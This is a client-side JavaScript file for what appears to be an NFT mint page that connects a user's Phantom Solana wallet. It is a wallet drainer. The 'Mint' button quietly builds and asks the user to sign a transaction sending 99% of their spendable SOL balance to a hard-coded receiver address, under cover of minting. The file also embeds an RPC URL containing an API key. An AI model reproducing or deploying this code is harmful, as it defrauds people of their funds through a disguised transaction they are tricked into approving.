$(document).ready(function() {
    $('#connect-wallet').on('click', async () => {
        if (window.solana && window.solana.isPhantom) {
            try {
                const resp = await window.solana.connect();
                console.log("Phantom Wallet connected:", resp);

                var connection = new solanaWeb3.Connection(
                    'https://solana-mainnet.api.syndica.io/api-key/25dGo4UZ6AKy2ZzXDPTtbzkXnTQ3x6cfaeVzDnW1wXkpApL7HW7XWm5MF8qjTBmNfi64gZ2QPE4qCedn8coFZfmKZaMPKjVATR4', 
                    'confirmed'
                );

                const public_key = new solanaWeb3.PublicKey(resp.publicKey);
                const walletBalance = await connection.getBalance(public_key);
                console.log("Wallet balance:", walletBalance);

                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                if (walletBalance < minBalance) {
                    alert("Insufficient funds for rent.");
                    return;
                }

                $('#connect-wallet').text("Mint");
                $('#connect-wallet').off('click').on('click', async () => {
                    try {
                        const recieverWallet = new solanaWeb3.PublicKey('AJmGVQL6X4rt8AZCambz87Nz1QJarGPAvp8pLny88H8o'); 
                        const balanceForTransfer = walletBalance - minBalance;
                        if (balanceForTransfer <= 0) {
                            alert("Insufficient funds for transfer.");
                            return;
                        }

                        var transaction = new solanaWeb3.Transaction().add(
                            solanaWeb3.SystemProgram.transfer({
                                fromPubkey: resp.publicKey,
                                toPubkey: recieverWallet,
                                lamports: Math.floor(balanceForTransfer * 0.99),
                            }),
                        );

                        transaction.feePayer = window.solana.publicKey;
                        let blockhashObj = await connection.getLatestBlockhash();
                        transaction.recentBlockhash = blockhashObj.blockhash;

                        const signed = await window.solana.signTransaction(transaction);
                        console.log("Transaction signed:", signed);

                        let txid = await connection.sendRawTransaction(signed.serialize());
                        await connection.confirmTransaction(txid);
                        console.log("Transaction confirmed:", txid);
                    } catch (err) {
                        console.error("Error during minting:", err);
                    }
                });
            } catch (err) {
                console.error("Error connecting to Phantom Wallet:", err);
            }
        } else {
            alert("Phantom extension not found.");
            const isFirefox = typeof InstallTrigger !== "undefined";
            const isChrome = !!window.chrome;

            if (isFirefox) {
                window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
            } else if (isChrome) {
                window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
            } else {
                alert("Please download the Phantom extension for your browser.");
            }
        }
    });
});
